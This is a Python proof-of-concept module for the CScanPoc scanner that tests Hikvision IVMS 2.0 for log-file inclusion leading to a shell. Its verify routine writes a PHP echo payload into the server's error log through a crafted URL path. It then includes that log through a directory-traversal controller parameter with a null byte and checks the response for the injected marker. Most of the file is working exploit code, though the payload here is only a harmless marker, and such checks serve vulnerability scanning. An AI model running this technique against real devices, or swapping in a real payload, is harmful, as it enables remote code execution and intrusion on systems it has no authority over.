# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Hikvision_0006'  # 平台漏洞编号，留空
    name = '海康威视IVMS系列2.0 日志文件包含getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2013-02-03'  # 漏洞公布时间
    desc = '''
        海康威视IVMS系列2.0 日志文件包含getshell.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hikvision'  # 漏洞应用名称
    product_version = '海康威视IVMS系列2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '13311838-356f-4fb8-9cfb-5bc342aaa5cd'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            exp1 = url + "/<?php echo '03815b953d00d9d146f629d6f6c29dc7';?>"
            exp2 = url + "/index.php?controller=../../../../Server/logs/error.log%00.php"
            hh.http(exp1)
            req = requests.get(exp2)
            if req.status_code == 200:
                if re.findall(r'03815b953d00d9d146f629d6f6c29dc7', req.text):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
